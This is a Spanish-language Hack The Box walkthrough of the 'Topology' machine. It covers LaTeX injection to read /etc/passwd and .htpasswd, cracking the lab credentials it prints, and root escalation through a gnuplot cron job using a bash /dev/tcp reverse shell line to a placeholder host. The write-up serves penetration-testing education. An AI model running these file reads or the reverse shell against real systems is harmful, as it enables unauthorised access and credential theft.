# Topology

![q1](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/bebd3d0f-e8ed-4188-ade4-d450c69a5a44)

## Fase de reconocimiento

En primer lugar, realizamos un ping -c1 <ip> a la ip de la maquina para verificar conectividad. Como observamos, el ttl de respuesta del ping posee el numero 63, es decir que probablemente estemos ante un sistema Linux (ttl 64). 

Arrancamos haciendo un escaner de todos los puertos utilizando nmap con los parametros en cuestion para agilizar el escaneo.

Los puertos abiertos que resultaron del escaneo fueron el 22 (SSH) y el puerto 80 (HTTP). Luego, realizamos un descubrimiento de servicios y versiones mas detallado en los puertos en cuestion:

![q2](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/cbfae21a-3f3c-47d8-8cf7-873c4355b8a9)

Vemos que se esta hosteando un servicio apache 2.4.41 e ingresamos a traves del navegador al mismo:

![q3](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/78493217-e72e-4fee-a199-2551421e9e7f)

Parece ser una pagina de investigacion de una universidad. Los datos que rescatamos de la misma son la informacion de los 3 profesores, asi como tambien un email de uno de ellos que nos puede llegar a resultar util en un futuro.

Uno de los proyectos que aparecen posee un link a latex.topology.htb/equation.php asique para poder ingresar ahi debemos agregar la ip de la maquina victima junto con esa ruta a nuestro file /etc/hosts.

![q4](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/6cdd63cf-423b-44ab-b8e7-e319022b5799)

Parece ser una pagina que nos permite inyectar codigo en formato LaTeX y luego del lado del servidor este mismo se interpreta y devuelve una imagen con la formula en cuestion.

Antes de continuar, y dado que encontramos el subdominio latex.topology.htb, realizamos una busqueda con wfuzz sobre otros posibles subdominios y encontramos otro: dev.topology.htb asique lo añadimos al /etc/hosts.

![q5](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/4e4f8e7d-c81a-475e-ab1c-8538c70ed0fc)

Nos pide credenciales, las cuales no poseemos, asique seguimos investigando la pagina del subdominio de latex.

## Explotación

El siguiente paso requiere de mucha investigacion, pero finalmente nos encontramos con un par de paginas que hablan del tema de latex exploitation. Una de ellas es la famosa pagina https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection. 

Despues de un rato de probar varias combinaciones y recibir periodicamente el mensaje en png 

![q6](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/b0ac82c4-f609-4c01-b226-922359f0b04d)

Logramos dar con una combinacion que nos permite leer archivos locales de la maquina en el formato png (LFI vulnerability):

 
![q7](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/29a3be97-6698-4aa2-adfe-9b9a92e5623f)


Si la ejecutamos asi como esta, no funciona porque al parecer tiene errores, pero si le agregamos al inicio y al final el signo $ obtenemos el contenido del archivo en cuestion que queramos!

En este caso /etc/passwd:

![q8](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/1976821e-e02d-4fd5-92ae-1d95d238663e)

Aprovechando este exploit, y sabiendo que generalmente en los webservers de apache tenemos un archivo llamado .htpasswd que almacena las credenciales, podemos probar obtener este archivo del directorio dev encontrado anteriormente para ver si conseguimos las credenciales:

![q9](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/5b963377-3217-4dc2-bbe1-a3cef64069c3)

Perfecto! Ahora podemos crackear este hash facilmente con hashcat o john.

Si nos fijamos en la pagina de hashcat que tipo es para luego utilizar ese modo de cracking obtenemos lo siguiente:

![q10](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/17a7a072-4e46-48a6-8f3a-c595726c3814)

![q11](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/7edb62ac-8422-4bc4-918c-ebca46410b99)

Creackeado! user:vdaisley y password:calculus20. Usamos estas credenciales para acceder a dev.topology.htb

![q12](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/b8cbf0c8-a83c-45de-a3a6-c1323ab2ca04)

Esta pagina parece ser el portafolio de las dos primeras personas que aparecian en el staff de la web principal.

A primera vista, y mirando el codigo fuente, no parece haber ningun link de utilidad.

Procedemos a hacer directory busting para ver si conseguimos recabar mas informacion, pero no encontramos nada.

En este punto, creo que estamos ante un rabbit hole, es decir que no vale la pena seguir investigando esta pagina porque no vamos a encontrar nada. Un buen articulo que recomiendo sobre este tema es el siguiente: https://medium.com/@luke.williams1248/on-pen-testing-rabbit-holes-and-how-to-avoid-them-ed7b93cdfaa5. 

Continuando con la maquina, y recordando que poseemos credenciales que crackeamos para el user vdaisley, probamos conectarnos por SSH y tenemos exito!:

![q13](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/e25767c2-f5ee-4f19-9c3e-b978b026d8a6)


## Escalar privilegios

Arrancamos a investigar que permisos posee el usuario. Con respecto a SUDO no posee ninguno, binarios SUID ninguno que sirva, no tenemos acceso de lectura al /etc/shadow ni escritura al /etc/passwd. 

Utilizando hostname -I, el comando ls -la para chequear que no haya un .dockerenv descartamos que estemos dentro de un contenedor.

Realizando password and ssh keys looting tampoco encontramos nada, ni cron jobs o capabilites utiles.

Posterior a esta investigacion de privilige escalation tradicional, podemos usar pspy para poder monitorizar los procesos de linux sin necesidad de ser root:

![q14](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/d0eeee6e-60e5-41b1-854f-e38ae6f8dcdc)

Vemos un proceso interesante que esta ejecutando el UID=0, es decir root. No solo eso, sino que en la carpeta /opt, que generalmente se encuentra vacia.

![q15](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/100805e6-6c3b-45d2-9f41-86aee1688f91)

Segun los permisos podemos afirmar que el directorio pertenece a root y que cualquiera tiene capacidad de escritura y ejecucion, pero no de lectura.

En base a esto, y dado que sabemos que pertenece a root y que el mismo ejecuta con el comando find “/opt/gnuplot” -name “*.plt” -exec gnuplot {} \; todos los archivos en este directorio con extension .plt, podemos crear un archivo malintencionado que nos de los privilegios que queremos:

Como no podemos ingresar a leer directamente en ese directorio, debemos crear nuestro archivo .plt en nuestro /home y luego hacer un mv a /opt/gnuplot. 

Utilizando este codigo podemos obtener una reverse shell que sea invocada por el root:

```bash
# Reverse shell
system "bash -c 'bash -i >& /dev/tcp/<ipLocal>/<puerto> 0>&1'"
```

![q16](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/9d34a2ae-ff45-46f3-baed-74f06870baf0)

### Pwned!
